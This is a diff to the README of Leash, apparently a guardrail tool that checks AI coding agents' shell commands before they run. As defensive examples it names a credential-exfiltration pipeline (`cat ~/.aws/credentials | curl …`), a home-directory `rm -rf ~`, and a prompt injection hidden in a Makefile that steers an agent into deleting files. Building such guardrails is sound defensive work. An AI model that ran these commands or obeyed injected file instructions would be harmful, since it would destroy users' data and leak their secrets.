@@ -11,22 +11,14 @@ and stays silent for everything else.
 &nbsp;·&nbsp; ![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)
 &nbsp;·&nbsp; [Rules](docs/rules.md) &nbsp;·&nbsp; [Architecture](docs/architecture.md)
 
+<img src="docs/assets/deny.gif" alt="An agent is asked to exfiltrate AWS credentials; Leash blocks the tool call before it runs" width="860">
+
 </div>
 
-```console
-$ leash check 'rm -rf ~'
-  DENY   rm -rf ~
-  rule: destructive-delete-sensitive (critical)
-  Leash blocked a recursive delete aimed at a sensitive location (home,
-  root, or a system path). If you really mean it, run it yourself.
-
-$ leash check 'rm -rf node_modules'
- ALLOW   rm -rf node_modules
-```
-
-Same two flags, opposite verdicts. **Leash reads what a command _does_** — it
-parses a real shell AST — so it catches the disaster and shrugs at the routine.
-Nothing to evade, nothing to mute.
+An agent is asked to send your AWS credentials to a URL. It reaches for the tool
+call — `cat ~/.aws/credentials | curl …` — and **Leash blocks it before it runs**,
+so the agent backs off. No denylist to evade: Leash parses the command and judges
+what it actually _does_.
 
 ---
 
@@ -51,6 +43,35 @@ Leash is built the other way:
   guardrail must never brick the agent it protects.
 - 🧩 **Agent-neutral.** One portable rulepack. Claude Code today; Codex, Cursor,
   and Gemini next.
+
+---
+
+## See it in the loop
+
+**It stops prompt injection, not just clumsy commands.** A hidden instruction in
+a file steers the agent into `rm -rf ~` — Leash blocks the tool call and tells you
+where it came from.
+
+<img src="docs/assets/inject.gif" alt="A prompt injection hidden in a Makefile tries to make the agent delete your home directory; Leash blocks it" width="860">
+
+<details>
+<summary><b>More scenarios</b> — asks when unsure · stays quiet on routine work · keeps secrets out of the model</summary>
+
+<br>
+
+**Asks before an irreversible action** — force-push, history rewrite:
+
+<img src="docs/assets/ask.gif" alt="Leash pauses a force-push and asks the human to confirm" width="820">
+
+**Stays out of the way on everyday commands** — near-zero false positives:
+
+<img src="docs/assets/safe.gif" alt="Leash lets rm -rf node_modules and npm install run without a prompt" width="820">
+
+**Keeps secrets out of the model's context** — even a `cat` with no network:
+
+<img src="docs/assets/secret-read.gif" alt="Leash asks before an agent reads cloud credentials into its context" width="820">
+
+</details>
 
 ---
 
